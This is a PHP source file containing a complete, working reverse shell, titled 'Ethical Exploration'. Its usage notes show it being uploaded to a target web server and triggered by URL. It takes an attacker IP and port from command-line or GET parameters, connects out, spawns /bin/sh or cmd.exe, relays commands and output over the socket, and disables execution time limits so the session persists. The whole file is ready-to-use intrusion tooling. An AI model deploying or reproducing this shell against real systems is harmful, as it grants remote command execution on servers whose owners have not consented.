<?php
/**
 * Ethical Exploration - Interactive PHP Reverse Shell
 * License: GNU General Public License v3.0 (GPL-3.0)
 * Usage:
 *   CLI: php reverseshell.php [IP] [PORT]
 *   Web: http://target/reverseshell.php?ip=10.0.0.1&port=4444
 */

// Configuration defaults
$ip = '127.0.0.1';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;

// Allow dynamic CLI or HTTP parameter overriding
if (php_sapi_name() === 'cli') {
    if (isset($argv[1])) { $ip = $argv[1]; }
    if (isset($argv[2])) { $port = (int)$argv[2]; }
} else {
    if (isset($_GET['ip'])) { $ip = $_GET['ip']; }
    if (isset($_GET['port'])) { $port = (int)$_GET['port']; }
}

// Select suitable shell binary based on OS
$shell = 'uname -a 2>&1';
if (stripos(PHP_OS, 'WIN') === 0) {
    $shell = 'cmd.exe';
} else {
    $shell = '/bin/sh -i';
}

// Ensure execution limits do not terminate shell
@set_time_limit(0);
@ignore_user_abort(true);
@ini_set('max_execution_time', 0);

print("[*] Connecting back to {$ip}:{$port}...\n");

$sock = @fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    print("[!] Connection failed: {$errstr} ({$errno})\n");
    exit(1);
}

// Define process descriptors for bidirectional pipe
$descriptorspec = array(
    0 => array("pipe", "r"), // stdin
    1 => array("pipe", "w"), // stdout
    2 => array("pipe", "w")  // stderr
);

$process = @proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    print("[!] Failed to spawn process: {$shell}\n");
    fclose($sock);
    exit(1);
}

// Set non-blocking mode
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

fwrite($sock, "[+] PHP Reverse Shell Connected successfully!\n");
fwrite($sock, "[+] Shell: " . $shell . " on " . php_uname() . "\n\n");

while (true) {
    if (feof($sock)) {
        break;
    }
    if (feof($pipes[1])) {
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = @stream_select($read_a, $write_a, $error_a, null);

    if ($num_changed_sockets === false) {
        break;
    }

    // Read from socket and write to shell stdin
    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        if (strlen($input) > 0) {
            fwrite($pipes[0], $input);
        }
    }

    // Read stdout from shell and write to socket
    if (in_array($pipes[1], $read_a)) {
        $output = fread($pipes[1], $chunk_size);
        if (strlen($output) > 0) {
            fwrite($sock, $output);
        }
    }

    // Read stderr from shell and write to socket
    if (in_array($pipes[2], $read_a)) {
        $stderr = fread($pipes[2], $chunk_size);
        if (strlen($stderr) > 0) {
            fwrite($sock, $stderr);
        }
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
